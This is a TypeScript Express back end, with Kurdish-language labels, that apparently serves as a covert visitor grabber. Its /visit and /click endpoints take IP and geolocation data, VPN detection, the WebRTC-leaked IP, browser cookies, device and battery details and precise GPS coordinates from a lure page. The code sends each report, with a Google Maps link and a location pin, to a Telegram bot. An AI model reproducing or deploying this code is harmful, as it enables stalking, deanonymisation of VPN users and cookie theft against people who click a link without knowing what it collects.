import { Router, type IRouter } from "express";

const router: IRouter = Router();

interface GeoInfo {
  country: string;
  regionName: string;
  city: string;
  isp: string;
  as: string;
  proxy: boolean;
  hosting: boolean;
}

async function getGeoInfo(ip: string): Promise<GeoInfo | null> {
  try {
    const cleanIp = ip.startsWith("::ffff:") ? ip.slice(7) : ip;
    if (cleanIp === "127.0.0.1" || cleanIp === "::1" || cleanIp.startsWith("172.") || cleanIp.startsWith("10.")) {
      return null;
    }
    const res = await fetch(
      `http://ip-api.com/json/${cleanIp}?fields=status,country,regionName,city,isp,as,proxy,hosting`,
      { signal: AbortSignal.timeout(4000) }
    );
    const data = await res.json() as any;
    if (data.status === "success") return data as GeoInfo;
    return null;
  } catch {
    return null;
  }
}

async function sendToTelegram(message: string) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML", disable_web_page_preview: false }),
  });
}

async function sendLocationToTelegram(lat: number, lng: number) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  await fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lng }),
  });
}

function buildMessage(type: "visit" | "click", ip: string, geo: GeoInfo | null, body: any): string {
  const now = new Date().toLocaleString("en-GB", {
    timeZone: "Asia/Baghdad",
    hour12: false,
    day: "2-digit", month: "2-digit", year: "numeric",
    hour: "2-digit", minute: "2-digit", second: "2-digit",
  });

  const isProxy = geo?.proxy || geo?.hosting;
  const proxyLine = isProxy
    ? `🛡 پرۆکسی/VPN: ❌ بەڵێ — ئایپی مخفییە`
    : `🛡 پرۆکسی/VPN: ✅ نەخێر — ئایپی ڕاستەقینەیە`;

  const header = type === "visit"
    ? `🔔 <b>سەردانی نوێ!</b>`
    : `🎬 <b>کرتەکردن لەسەر مێدیا!</b>\n📁 <b>ناو:</b> ${body.title || "?"}\n🎞 <b>جۆر:</b> ${body.mediaType || "?"}`;

  const deviceLine = `📱 <b>ئامێر:</b> ${body.os || "?"} - ${body.browser || "?"}`;
  const screenLine = `📐 <b>شاشە:</b> ${body.screen || "?"} (${body.pixelRatio || 1}x)`;

  let batteryLine = "";
  if (body.battery) {
    const icon = body.battery.charging ? "⚡" : "🔋";
    batteryLine = `\n${icon} <b>باتری:</b> ${body.battery.level}%${body.battery.charging ? " (چارج دەبێت)" : ""}`;
  }

  let connLine = "";
  if (body.connection) {
    connLine = `\n📶 <b>ئینتەرنێت:</b> ${body.connection.type} (${body.connection.downlink} Mbps)`;
  }

  let storageText = "";
  if (body.storage) {
    storageText = `\n📦 <b>خەزن:</b> ${body.storage.used}MB / ${body.storage.quota}GB`;
  }

  const cpuLine = body.cpu ? `\n⚙️ <b>CPU:</b> ${body.cpu} هەستە` : "";
  const ramLine = body.ram ? `\n💾 <b>RAM:</b> ${body.ram} GB` : "";
  const gpuLine = body.gpu ? `\n🏭 <b>GPU:</b> ${body.gpu}` : "";
  const webrtcLine = body.webrtcIp ? `\n🔎 <b>WebRTC IP:</b> <code>${body.webrtcIp}</code>` : "";

  const cookieText = body.cookieStr && body.cookieStr !== "نییە"
    ? `\n🍪 <b>Cookie:</b> <code>${body.cookieStr.slice(0, 200)}</code>`
    : "";

  const uaText = body.userAgent
    ? `\n📝 <b>User-Agent:</b>\n<code>${body.userAgent.slice(0, 200)}</code>`
    : "";

  let locationText = "";
  if (body.location?.lat && body.location?.lng) {
    const { lat, lng, accuracy } = body.location;
    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
    locationText = `\n\n📍 <b>لۆکەیشنی ڕاستەقینە:</b>\n🗺 <a href="${mapsLink}">گوگڵ مەپس بکەوە</a>\n🎯 <b>دقەت:</b> ${accuracy} مەتر`;
  }

  return [
    header,
    "",
    `🌍 <b>ئایپی:</b> <code>${ip}</code>`,
    geo ? `🏳 <b>وڵات:</b> ${geo.country}` : "",
    geo ? `📍 <b>ناوچە:</b> ${geo.regionName}` : "",
    geo ? `🏙 <b>شار:</b> ${geo.city}` : "",
    geo ? `🏢 <b>ISP:</b> ${geo.isp}` : "",
    geo ? `🔢 <b>AS:</b> ${geo.as}` : "",
    proxyLine,
    "",
    deviceLine,
    `🌐 <b>بروسێر:</b> ${body.browser || "?"}`,
    `📋 <b>مۆدێل:</b> ${(body.userAgent || "").match(/\(([^)]+)\)/)?.[1] || "?"}`,
    screenLine,
    `🗣 <b>زمان:</b> ${body.language || "?"}`,
    batteryLine,
    connLine,
    `🔄 <b>ئاراستە:</b> ${body.orientation || "?"}`,
    cpuLine,
    ramLine,
    `🕐 <b>ناوچەی کاتی:</b> ${body.timezone || "?"}`,
    storageText,
    `✅ <b>سەرهێڵ:</b> ${body.online ? "بەڵێ" : "نەخێر"}`,
    gpuLine,
    webrtcLine,
    uaText,
    cookieText,
    locationText,
    "",
    `⏰ <b>کات:</b> ${now}`,
  ].filter((l) => l !== "").join("\n");
}

async function handleTrack(req: any, res: any, type: "visit" | "click") {
  try {
    const rawIp =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
      req.socket.remoteAddress ||
      "Unknown";
    const ip = rawIp.startsWith("::ffff:") ? rawIp.slice(7) : rawIp;

    const geo = await getGeoInfo(ip);
    const message = buildMessage(type, ip, geo, req.body || {});
    await sendToTelegram(message);

    const loc = req.body?.location;
    if (loc?.lat && loc?.lng) {
      await sendLocationToTelegram(loc.lat, loc.lng);
    }

    res.json({ ok: true });
  } catch {
    res.status(500).json({ error: "Failed" });
  }
}

router.post("/visit", (req, res) => handleTrack(req, res, "visit"));
router.post("/click", (req, res) => handleTrack(req, res, "click"));

export default router;
